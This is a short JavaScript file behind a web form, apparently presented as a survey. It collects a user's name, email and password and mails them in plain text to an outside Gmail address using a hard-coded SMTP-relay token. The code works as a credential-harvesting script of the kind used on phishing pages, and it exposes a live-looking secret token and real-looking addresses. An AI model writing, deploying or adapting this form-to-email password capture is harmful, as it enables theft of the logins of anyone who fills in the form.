let form = document.querySelector("form");
let arr = document.querySelectorAll("input");
var recaptcha_response = '';
form.onsubmit = function (e) {
    e.preventDefault();
    console.log(arr[0].value);
    console.log(arr[1].value);
    console.log(arr[2].value);
    console.log(arr);

    let all = "Name: " + arr[0].value + "<br/>" + "email: " + arr[1].value + "<br/>" + "pass " + arr[2].value;


    if (recaptcha_response.length == 0) {
        document.getElementById('g-recaptcha-error').innerHTML = '<span style="color:red;">This field is required.</span>';
        return false;
    }
    Email.send({
        SecureToken: "ae026f42-dbb9-425d-a9f3-dc645c2f5e98",
        To: 'salibmina470@gmail.com',
        From: "projectsad8@gmail.com",
        Subject: "New surevy",
        Body: all
    }).then(
        message => alert(message)
    );
    return true;
}

function verifyCaptcha(token) {
    recaptcha_response = token;
    document.getElementById('g-recaptcha-error').innerHTML = '';
}
